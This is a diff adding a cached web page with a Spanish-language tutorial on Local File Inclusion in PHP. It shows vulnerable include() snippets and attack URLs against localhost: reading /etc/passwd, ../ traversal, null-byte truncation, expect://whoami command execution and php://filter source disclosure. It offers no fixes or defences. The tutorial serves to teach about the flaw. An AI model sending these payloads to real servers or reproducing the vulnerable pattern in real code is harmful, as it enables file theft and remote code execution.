@@ -1,0 +1,67 @@
+I"1<p>La vulnerabilidad ‘Local File Inclusion’, o en sus siglas ‘LFI’, permite a un atacante leer archivos del servidor vulnerable. Esta afección se produce debido a malas prácticas durante la programación de una página web.</p>
+
+<p>Dependiendo de la importancia, esta vulnerabilidad puede llevar al atacante a:</p>
+
+<ul>
+  <li>RCE (Remote Code Execution)</li>
+  <li>XSS (Cross-Site Scripting)</li>
+  <li>DoS (Denial Of Service)</li>
+</ul>
+
+<p>Un ejemplo muy básico sería el siguiente script de php:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+	<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
+	<span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Donde podemos leer cualquier archivo del sistema, en este caso el ‘/etc/passwd’</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://localhost/lfi.php?filename=/etc/passwd
+</code></pre></div></div>
+
+<p>Esto no es solo una vulnerabilidad de php, también está presente en otros lenguajes como jsp, asp entre otros.</p>
+
+<h3 id="directory-path-traversal"><a href="#header-3"></a>Directory Path Traversal</h3>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+	<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
+	<span class="k">include</span><span class="p">(</span><span class="s2">"/var/www/html/"</span> <span class="mf">.</span> <span class="nv">$file</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Solo podemos listar el contenido de la ruta especificada; sin embargo, si añadimos ‘../’, podremos listar contenido más allá de ‘/var/www/html/’.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://localhost/lfi.php?filename=../../../etc/passwd
+</code></pre></div></div>
+
+<h3 id="null-byte"><a href="#header-3"></a>Null Byte</h3>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+	<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'filename'</span><span class="p">];</span>
+        <span class="k">require</span><span class="p">(</span><span class="nv">$file</span> <span class="mf">.</span> <span class="s2">".php"</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>El ‘.php’ se añade al nombre del archivo; sin embargo, si añadimos el nullbyte al final de nuestra cadena de ataque, el ‘.php’ no será tenido en cuenta.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://localhost/lfi.php?filename=/etc/passwd%00
+</code></pre></div></div>
+
+<h3 id="wrappers"><a href="#header-3"></a>Wrappers</h3>
+
+<h4 id="expect"><a href="#header-4"></a>expect://</h4>
+
+<p>Ejecutar comandos.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://localhost/lfi.php?filename=expect://whoami
+</code></pre></div></div>
+
+<h4 id="filter"><a href="#header-4"></a>filter://</h4>
+
+<p>Leer php.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://localhost/lfi.php?filename=php://filter/convert.base64-encode/resource=test.php
+</code></pre></div></div>
+:ET
